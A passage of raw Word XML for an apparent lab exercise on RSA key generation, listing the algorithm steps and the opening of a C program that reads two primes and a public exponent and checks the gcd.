        <w:t>ers p and q</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>2. Co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>=pxq</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="6" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>3. Cho</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>odu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>us:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="138"/>
        </w:rPr>
        <w:t>Ø</w:t>
      </w:r>
      <w:r>
        <w:t>(n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>=(p-1)x(q-1)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>4. Se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a random</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>encryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">key e such </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>gcd(e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="138"/>
        </w:rPr>
        <w:t>Ø</w:t>
      </w:r>
      <w:r>
        <w:t>(n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>=1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="6" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>5. Decrypt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>by co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">=1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>od</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="138"/>
        </w:rPr>
        <w:t>Ø</w:t>
      </w:r>
      <w:r>
        <w:t>(n)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>6. Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pub</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>key{e,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>7. Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>key{d,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>}</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t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>power(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,uns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">gned </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>gcd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>lti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>veIn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>erse(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>);</w:t>
      </w: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220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p,q,n,e,d,p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>,M,C;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pP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rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>wo pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>nu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">bers p and q </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>equal</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>scanf("%d %d",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>p,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>q);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>n =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p * q;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220" w:right="5725"/>
      </w:pPr>
      <w:r>
        <w:t>phi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>= (p - 1)*(q - 1); pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("Ph</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>(%d)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>%d",n,ph</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>); 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rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>eger e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>"); scanf("%d",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>e);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">f(e &gt;= 1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ph</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(gcd(p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>,e)!=1)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>nChoose</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>proper va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>for e !!!</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>urn 1;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
